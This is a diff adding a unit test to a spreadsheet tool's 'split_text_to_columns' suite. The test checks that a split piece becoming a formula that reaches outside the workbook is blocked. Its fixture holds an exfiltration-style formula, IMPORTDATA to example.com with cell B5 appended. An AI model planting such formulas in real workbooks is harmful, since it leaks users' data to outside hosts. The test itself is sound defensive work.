@@ -154,6 +154,18 @@ describe('split_text_to_columns', () => {
     expect(wb.undoLabels()).toEqual(['Protect range', 'Merge cells']);
   });
 
+  it('blocks a piece that becomes a formula reaching outside the workbook, as a typed one is', () => {
+    const { wb, id, env, run } = setup([['x;=IMPORTDATA("https://example.com/?"&B5)'], ['y;2']]);
+    expect(env.distrust).not.toHaveBeenCalled();
+    const out = JSON.parse(run('split_text_to_columns', { range: 'A1:A2', delimiters: [';'] }).content);
+    expect(wb.getCell(id, 0, 1).f).toMatch(/^IMPORTDATA/);
+    expect(env.distrust).toHaveBeenCalled();
+    expect(out.blocked_note).toMatch(/#BLOCKED!/);
+    const { env: plain, run: runPlain } = setup([['a;=1+2']]);
+    runPlain('split_text_to_columns', { range: 'A1', delimiters: [';'] });
+    expect(plain.distrust).not.toHaveBeenCalled();
+  });
+
   it('refuses a destination on another sheet', () => {
     const { wb, run } = setup([['a,b']]);
     wb.addSheet('Other');
